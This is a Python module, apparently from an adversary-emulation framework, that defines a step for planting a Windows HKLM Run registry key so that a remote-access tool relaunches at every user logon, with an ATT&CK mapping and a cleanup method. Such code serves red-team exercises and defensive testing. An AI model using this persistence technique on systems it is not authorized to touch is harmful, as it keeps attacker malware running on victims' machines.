from plugins.adversary.app.commands import reg
from plugins.adversary.app.operation.operation import Step, OPHost, OPRat, OPVar, OPPersistence, OPRegKey


class HKLMRunKeyPersist(Step):
    """
    Description:
        This step creates an entry in the registry under the Local Machine hive on a given target machine in order
        to maintain persistence (HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run).
    Requirements:
        Requires an elevated RAT.
    """
    attack_mapping = [('T1060', 'Persistence'), ('T1106', 'Execution')]
    display_name = "hklm_runkey_persist"
    summary = ("Use reg.exe to gain persistence by inserting a run key value into the Local Machine hive (HKLM). This"
               "will cause the rat to be executed in the user context of any user that logs on to the system")

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host")))]

    postconditions = [("regkey_g", OPRegKey),
                      ("persist_g", OPPersistence({"host": OPVar("host"), "elevated": False}))]

    significant_parameters = ["host"]

    preproperties = ["rat.executable"]

    postproperties = ["regkey_g.key", "regkey_g.value", "regkey_g.data",
                      "persist_g.regkey_artifact"]

    @staticmethod
    def description(rat, host):
        return "Creating a local machine run key on {}".format(host.hostname)

    @staticmethod
    async def simulate(operation, rat, host, regkey_g, persist_g):
        return True

    @staticmethod
    async def action(operation, rat, host, regkey_g, persist_g):
        value = "caldera"
        data = rat.executable
        run_key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

        # Add run key
        await operation.execute_shell_command(rat, *reg.add(key=run_key, value=value, data=data, force=True))

        regkey = await regkey_g({'host': host, 'key': run_key, 'value': value, 'data': data})
        await persist_g({'regkey_artifact': regkey})

        return True

    @staticmethod
    async def cleanup(cleaner, regkey_g):
        for regkey in regkey_g:
            await cleaner.delete(regkey)
